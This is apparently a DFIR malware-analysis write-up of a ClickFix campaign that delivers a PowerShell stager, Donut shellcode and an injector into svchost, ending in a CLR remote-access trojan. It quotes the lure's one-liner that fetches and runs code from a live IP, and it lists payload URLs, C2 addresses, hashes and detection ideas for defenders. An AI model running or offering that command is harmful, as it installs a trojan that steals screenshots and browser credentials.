---
id: clickfix-clr-rat
title: "ClickFix to CLR RAT Delivery Chain"
summary: "ClickFix PowerShell lure to Donut shellcode, native MinGW injector into BluetoothUserService svchost, CLR implant sub00, and C2 on 91.92.243.161:3038."
category: DFIR
date: 2026-07-08
tags: [clickfix, donut, process-injection, clr, rat, delivery-chain]
---

# ClickFix to CLR RAT Delivery Chain

## Summary

```
CLASS      : RAT delivery / process injection
VECTOR     : ClickFix (PowerShell paste)
STAGE 1    : PowerShell stager → in-memory Donut shellcode
STAGE 2    : mod_s_enterprise (native MinGW loader / injector)
STAGE 3    : student_S.bin (native PE; CLR host candidate)
EXEC HOST  : svchost.exe -k BthAppGroup -p -s BluetoothUserService
IMPLANT    : CLR assembly sub00 (in-memory)
POST       : Screenshots, Edge DPAPI, additional unbacked CLR loads
C2         : 91.92.243.161:3038
```

ClickFix lure instructed the user to run a PowerShell one-liner. Stager fetched Donut-packed shellcode, executed it in-memory, and injected into a Bluetooth-related `svchost` instance. Runtime telemetry showed CLR assembly `sub00` in that process, then screenshot collection, browser credential access, and outbound C2.

## Attack Chain

```
User pastes ClickFix PowerShell command
  → iex(irm http://158.94.211.77/?sid=<random>)
  → PowerShell stager fetches http://158.94.211.76/s_enterprise
  → VirtualAlloc + Marshal.Copy + CreateThread (in-memory shellcode)
  → Donut unwrap → mod_s_enterprise (native PE injector)
  → Fetch http://158.94.211.76/enterprise/student_s.bin
  → Inject into svchost (BluetoothUserService)
  → CLR assembly sub00 loads in injected svchost
  → Screenshot / Edge DPAPI / additional unbacked CLR
  → C2 91.92.243.161:3038
```

## Initial Access - ClickFix

Fake verification workflow instructed the user to open PowerShell and execute:

```powershell
iex(irm http://158.94.211.77/?sid=<random>)
```

The response is a PowerShell stager, not the final payload. User execution is the only initial access mechanism - no exploit required.

## Stage 1 - PowerShell Shellcode Runner

Stager pivots to payload host `158.94.211.76` and retrieves:

```
/s_enterprise
```

Static indicators for `s_enterprise`:

- No PE headers; elevated entropy
- Strings dominated by high-entropy noise and packing prologue fragments (`WAVAWH`, `A_A^A]A\_^]`)
- Consistent with packed/encoded shellcode (Donut-class wrapper)

Payload never written to disk. Execution uses in-memory APIs:

```powershell
VirtualAlloc
Marshal.Copy
CreateThread
```

## Stage 2 - Donut → mod_s_enterprise

Donut decryption of `s_enterprise` yields native PE `mod_s_enterprise`.

### capa / ATT&CK

| ATT&CK Tactic | Technique |
|---|---|
| Defense Evasion | Process Injection: Thread Execution Hijacking [T1055.003] |
| Defense Evasion | Reflective Code Loading [T1620] |
| Discovery | Process Discovery [T1057] / Software Discovery [T1518] |
| Execution | Shared Modules [T1129] |
| Privilege Escalation | Access Token Manipulation [T1134] |

Capability highlights: WinHTTP request/response, TLS section, TLS callback patterns, `SeDebugPrivilege`, process enumeration, thread injection, execute shellcode via indirect call, spawn thread to RWX shellcode.

### Toolchain / imports

MinGW-compiled (GCC 15.x), not MSVC. Notable imports from `ADVAPI32.dll`, `KERNEL32.dll`, `WINHTTP.dll`:

```
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
OpenProcess
AdjustTokenPrivileges
WinHttp*
```

### Staging strings (UTF-16LE)

```
svchost.exe
powershell
158.94.211.76
enterprise/student_s.bin
```

`mod_s_enterprise` is a loader/injector, not the final implant. Hardcoded path:

```
158.94.211.76/enterprise/student_s.bin
```

## Stage 3 - student_S.bin

Retrieved PE:

```
student_S.bin: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 7 sections
```

### Not a managed assembly

```bash
ilspycmd -p -o student_STAGE student_S.bin
```

```
ICSharpCode.Decompiler.Metadata.PEFileNotSupportedException:
PE file does not contain any managed metadata.
```

Treat as native. Do not analyze as .NET without further evidence.

### sub00 string

```bash
rabin2 -zz student_S.bin | grep -i sub00
```

```
3137  0x00030de8  0x140030de8  5  6  .data  ascii  sub00
```

Single `.data` reference. Runtime correlation appears in Stage 4.

## Stage 4 - Injection and CLR Load

First visible execution remains inside PowerShell. Defender records in-memory CLR assembly:

```
jq5ksud0
```

Then:

```
CreateRemoteThreadApiCall
```

Target process:

```
svchost.exe -k BthAppGroup -p -s BluetoothUserService
```

Matches injection capability flagged by capa on `mod_s_enterprise`.

Second CLR assembly loads inside the same BluetoothUserService `svchost`:

```
sub00
```

Name matches the `student_S.bin` `.data` string.

### Correlation note

| Source | Finding |
|--------|---------|
| Static (`student_S.bin`) | Native PE; no managed metadata; string `sub00` in `.data` |
| Runtime (Defender) | CLR assembly named `sub00` in injected `svchost` |

Strong name correlation; mechanical link not fully confirmed. Manual CLR hosting (`mscoree.dll` / `CLRCreateInstance`) is the leading theory and was not confirmed from the import table captured in this pass.

## Stage 5 - Post-Injection Behavior

`BluetoothUserService` is a convenient legitimate `svchost` residence, not Bluetooth-specific tradecraft.

Defender telemetry from the injected process:

| Behavior | Observation |
|----------|-------------|
| Screenshots | `ScreenshotTaken` from injected service process |
| Credential access | `DPAPI Accessed / Microsoft Edge` |
| Further payloads | Multiple unbacked CLR assemblies loaded dynamically; no additional disk writes observed |

Working picture only: re-validate process attribution and event rows from `DeviceNetworkEvents` / `DeviceEvents` before customer-facing claims.

## Stage 6 - Command and Control

Post-execution infrastructure (not used for initial delivery):

```
91.92.243.161:3038
```

Sandbox execution of `student_S.bin` contacted the same host. Classification:

```
RAT
Generic Agent
C2 Activity
```

~28 MB outbound traffic observed in the surrounding window. Treat as **suspicious outbound transfer** until `DeviceNetworkEvents` rows are re-validated; do not label confirmed exfiltration without that evidence.

### Infrastructure roles

| Host | Role |
|------|------|
| `158.94.211.77` | ClickFix delivery |
| `158.94.211.76` | Payload staging (`/s_enterprise`, `/enterprise/student_s.bin`) |
| `91.92.243.161:3038` | Operational C2 |

## Artifacts

### s_enterprise

| Field | Value |
|-------|-------|
| Type | Donut shellcode wrapper (packed / high entropy) |
| Disk write | None (in-memory via PowerShell) |
| Unwraps to | `mod_s_enterprise` |

### mod_s_enterprise

```
MD5      881d500742127a52ae5a52a29de66ffb
SHA1     c4b150ad42a10b514a643357c8d7f9a9105f3ba1
SHA256   4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a
Format   PE32+, x86-64, MinGW/GCC 15.x
Role     Injector / secondary stage fetcher
```

### student_S.bin

```
Type     PE32+, x64, native (no managed metadata)
Compiled 2026-07-08 23:09:10 UTC
SHA256   53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db
String   sub00 (.data)
```

## Indicators of Compromise

### Hashes

```
mod_s_enterprise
  MD5     881d500742127a52ae5a52a29de66ffb
  SHA1    c4b150ad42a10b514a643357c8d7f9a9105f3ba1
  SHA256  4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a

student_S.bin
  SHA256  53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db
```

### Network

| Indicator | Role |
|-----------|------|
| `158.94.211.77` | ClickFix / initial PowerShell stage |
| `158.94.211.76` | Payload host |
| `http://158.94.211.76/s_enterprise` | Donut shellcode |
| `http://158.94.211.76/enterprise/student_s.bin` | Secondary PE |
| `91.92.243.161:3038` | Operational C2 |

### Process / runtime

```
svchost.exe -k BthAppGroup -p -s BluetoothUserService
CreateRemoteThreadApiCall → BluetoothUserService
CLR assemblies (in-memory): jq5ksud0, sub00
```

## Detection Opportunities

- PowerShell `irm | iex` against unknown IPs from interactive user context (ClickFix paste)
- PowerShell allocating RWX memory and creating threads without disk write of payload
- `CreateRemoteThread` into `svchost.exe` with `BluetoothUserService` / `BthAppGroup`
- Unbacked / memory-only CLR loads inside `svchost` or PowerShell (`sub00`, random names)
- `ScreenshotTaken` or Edge DPAPI access originating from `svchost` service instances
- Outbound connections from injected `svchost` to non-Microsoft infrastructure (e.g. `91.92.243.161:3038`)
- WinHTTP + classic injection import cluster (`VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread`) in MinGW-built binaries

## Open Questions

- How does native `student_S.bin` (no managed metadata) associate with CLR assembly `sub00` at runtime? Manual CLR hosting is unconfirmed from imports captured so far.
- What injection primitive does `student_S.bin` itself use? Strongest capa/import evidence currently sits on `mod_s_enterprise`.
- Is the ~28 MB outbound volume exfiltration or large staging/beacon traffic? Needs `DeviceNetworkEvents` validation.
- Is `91.92.243.161` the complete C2 set, or is additional infrastructure unresolved?
)
